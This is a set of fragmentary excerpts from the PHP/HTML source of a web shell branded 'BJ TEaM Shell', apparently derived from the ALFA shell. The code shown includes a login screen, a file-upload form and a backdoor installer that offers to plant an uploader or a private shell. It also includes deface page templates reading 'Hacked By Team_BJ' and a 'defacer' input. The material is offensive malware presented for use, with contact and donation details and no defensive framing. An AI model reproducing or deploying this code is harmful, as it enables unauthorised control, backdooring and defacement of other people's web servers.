...
<title>~ BJ TEaM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="BJ team 2012" draggable="false" src="http://solevisible.com/images/alfa-iran.png" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ BJ TEaM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ BJ TEaM Shell - v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ::..</title>
<style type="text/css">';?>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="200" height="170" alt="BJ team 2012" draggable="false" src="https://www.gifcen.com/wp-content/uploads/2023/09/hacker-gif-5.gif" /></td>
</tr>
<tr>
...
function __showicon($r){
	...
	$s['loader']='https://amp-test-aplication.com/Logo-Jitutoto777.svg';
...
$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('Poror Team is Here...!');\n?></textarea></p></div>";
$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='alfa'>BJ Team Uploader</option><option value='my'>My Private Shell</option></select>";
...
<font color='#00A220'>Shell Coded By Team_BJ (BJ TEaM)</font><br>
<font color='#00A220'>Contact : jitutoto@BJ.com</font><br>
<font color='#00A220'>Telegram Channel: @BJTools</font><br>
<font color='#FF0000'>Nikmati Hidup Tanpa Kopi bagaikan Bunga Tanpa Akar</font><br>
<font color='#FF0000'>BJ Shell Recorders</font><br>
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./BJ &copy; 2020-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: SAYA_INGIN_BELAJAR\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>BJ[at]gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/BJ'>@BJ</a></span></div></td>
</tr>
</table>
</div>
...
<textarea name=index rows='19' cols='103'><title>Hacked By Team_BJ</title><b>Hacked By Team_BJ</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
...
<title>Hacked By Team_BJ</title><b>Hacked By Team_BJ</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
<input type="text" name="defacer" size="67" id="text" placeholder="BJ TEaM 2012" />
<br>
